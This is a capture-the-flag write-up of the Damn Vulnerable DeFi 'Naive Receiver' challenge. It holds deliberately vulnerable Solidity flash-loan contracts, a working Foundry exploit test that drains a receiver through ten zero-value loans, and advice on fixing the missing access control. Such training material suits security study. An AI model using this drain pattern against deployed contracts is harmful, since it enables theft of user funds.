# Damn Vulnerable DeFi: Naive Receiver

## Challenge Description
There's a flash loan pool with 1000 ETH. There's also a receiver contract with 10 ETH. The receiver charges a fixed fee of 1 ETH for every flash loan. Your goal is to drain all 10 ETH from the receiver contract.

**Difficulty:** ⭐⭐ (Easy-Medium)

**Goal:** Empty the receiver contract's ETH balance.

## Vulnerable Contracts

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract NaiveReceiverLenderPool {
    uint256 public constant FIXED_FEE = 1 ether;

    function flashLoan(address receiver, uint256 borrowAmount) external payable {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH");

        // Send ETH to receiver
        (bool success, ) = receiver.call{value: borrowAmount}("");
        require(success, "Transfer failed");

        // Check if receiver paid back the loan + fee
        require(address(this).balance == balanceBefore + FIXED_FEE, "Fee not paid");
    }

    receive() external payable {}
}

contract NaiveReceiver {
    address public pool;
    address public owner;

    constructor(address _pool, address _owner) {
        pool = _pool;
        owner = _owner;
    }

    // This function is called by the pool during a flash loan
    receive() external payable {
        uint256 fee = 1 ether; // Fixed fee

        // Pay the fee to the pool
        (bool success, ) = pool.call{value: fee}("");
        require(success, "Fee payment failed");
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The `flashLoan` function in the pool does not check WHO is calling it!

Anyone can call `pool.flashLoan(receiverAddress, amount)`.
The pool will send ETH to the receiver, the receiver will pay the 1 ETH fee,
and the pool will keep the fee.

The receiver has 10 ETH. The fee is 1 ETH per loan.
If we call the flash loan function 10 times, the receiver will pay 10 ETH in fees,
draining its entire balance!
```

## Exploit Strategy

```text
Step 1: Identify the receiver contract address and the pool address.
Step 2: Call the pool's `flashLoan(receiver, 0)` function.
   - We borrow 0 ETH, but the receiver still pays the 1 ETH fixed fee!
Step 3: Repeat this 10 times.
Step 4: The receiver's balance goes from 10 ETH to 0 ETH.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DamnVulnerableDeFi/NaiveReceiver.sol";

contract NaiveReceiverExploitTest is Test {
    NaiveReceiverLenderPool public pool;
    NaiveReceiver public receiver;
    address public attacker = address(0xBEEF);

    function setUp() public {
        // Deploy pool and fund it with 1000 ETH
        pool = new NaiveReceiverLenderPool();
        vm.deal(address(pool), 1000 ether);

        // Deploy receiver and fund it with 10 ETH
        receiver = new NaiveReceiver(address(pool), address(0x1234));
        vm.deal(address(receiver), 10 ether);

        vm.deal(attacker, 1 ether); // For gas
    }

    function test_ExploitNaiveReceiver() public {
        console.log("Receiver balance before:", address(receiver).balance);

        vm.startPrank(attacker);

        // Call flashLoan 10 times, borrowing 0 each time
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(address(receiver), 0);
            console.log("Loan #", i + 1, "- Receiver balance:", address(receiver).balance);
        }

        vm.stopPrank();

        console.log("Receiver balance after:", address(receiver).balance);
        assertEq(address(receiver).balance, 0, "Receiver not drained");

        console.log("\n✅ EXPLOIT SUCCESSFUL! Receiver drained.");
    }
}
```

## Real-World Impact

```text
This is a classic "Missing Access Control" vulnerability.

In DeFi, many contracts have functions that should only be called by specific
addresses (like the owner, or a specific protocol). If these checks are missing,
anyone can trigger expensive operations.

Real-world examples:
- Protocols where anyone can trigger a "rebalance" function, causing the protocol
  to pay gas fees to the caller.
- Flash loan receivers that don't verify the caller is a trusted pool.

The Solution:
- ALWAYS add access control to sensitive functions.
- In this case, the pool should check: `require(msg.sender == authorizedCaller)`
  OR the receiver should check: `require(msg.sender == pool)`.
```

## Key Takeaways
- **Missing Access Control:** If a function doesn't check `msg.sender`, anyone can call it.
- **Fixed Fees can be Drained:** If a contract pays a fixed fee per call, an attacker can spam calls to drain it.
- **Borrowing 0 is valid:** Don't assume a flash loan must be > 0 unless explicitly checked.
- **Defense in Depth:** Both the caller and the receiver should verify each other's identities.
- **Lesson learned:** Always ask "Who is allowed to call this function?" and enforce it in code.
- **Next Challenge:** Trickle - a time-based token distribution exploit.